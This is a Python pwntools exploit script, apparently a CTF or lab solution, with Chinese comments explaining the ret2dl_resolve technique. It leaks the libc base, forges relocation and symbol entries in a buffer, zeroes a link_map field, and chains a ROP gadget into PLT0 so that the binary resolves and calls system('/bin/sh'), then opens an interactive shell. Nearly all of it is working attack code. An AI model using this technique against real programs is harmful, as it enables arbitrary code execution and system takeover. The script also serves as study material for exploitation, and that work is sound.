# encoding: utf-8

'''
dl_reslove(link_map, index) 流程
1. reloc = .rela.plt + index*3*8
2. sym = .dynsym + ((reloc->r_info)>>0x20)*3*8
3. assert(reloc->r_info & 0xff == 7 )
4. sym->st_other & 3 要等於 0
5. 坑洞: ndx = .gnu.version + ((reloc->r_info) >> 0x20)*2 會出錯 (因為 reloc->r_info 已經被我們改了)
   解法: 將 link_map + 0x1c8 寫入 0
6. 搜尋字串 [.dynsym + sym->st_name]
7. 將搜尋到的位址寫入 reloc->r_offset
8. return 到該位址

reloc:
r_offset +0
r_info   +8

sym:
st_name  +0
'''

from pwn import *

context.arch = 'amd64'

elf = ELF('./simple')
libc = ELF('./libc.so.6')
r = process('./simple')

buf = elf.symbols['buf']
pop_rdi = 0x400863
dl_resolve = 0x4005a0

# 控制 reloc 的位址
offset1 = 2             				# 用來滿足 assert
reloc = buf+offset1*0x8
rela_plt = 0x400510
index = (reloc - rela_plt)//(3*8)
assert(index*24+rela_plt == reloc)

# 控制 sym 的位址
offset2 = 2								# 用來滿足 assert
sym = reloc + offset2*0x8
dynsym = 0x4002c8
sym_idx = (sym-dynsym)//(3*8)
assert(sym_idx*24+dynsym == sym)
r_info = (sym_idx << 0x20) + 0x7

libc_base = int(r.recvline()[-13:-1], 16) - libc.symbols['setvbuf']
print("libc_base @ ", hex(libc_base))
link_map = libc_base + 0x61a170
sh = libc_base + libc.search('/bin/sh').next()

# 控制 sym->st_name 的位址
dynstr = 0x4003d0
system_str_addr = buf+(offset1+2+offset2-2+1)*8
st_name = system_str_addr - dynstr

# gdb.attach(r, 'b *0x400699')
# 將 link_map + 0x1c8 寫入 0
r.sendlineafter('addr:', hex(link_map+0x1c8))

r_offset = buf # 也可做 GOT Hijack, 但能控 rdi, 所以直接 system 

# 偽造 reloc 和 sym
r.sendlineafter('buf:', p64(0)*offset1 + flat(r_offset, r_info) + p64(0)*(offset2-2) + flat(st_name, 'system\x00')) # -2 是扣掉 reloc 大小 (0x10)

# bof 的 rop , 先控 rdi 參數, 再跳 dl_resolve, 這邊 dl_resolve 是跳 PLT0
# PLT0 再跳 dl_resolve 會將參數 (link_map, index) push 到 stack, 詳情請 gdb, 這邊我們控制 index
r.sendlineafter('a:', 'b'*9+flat(0, pop_rdi, sh, dl_resolve, index))

r.interactive()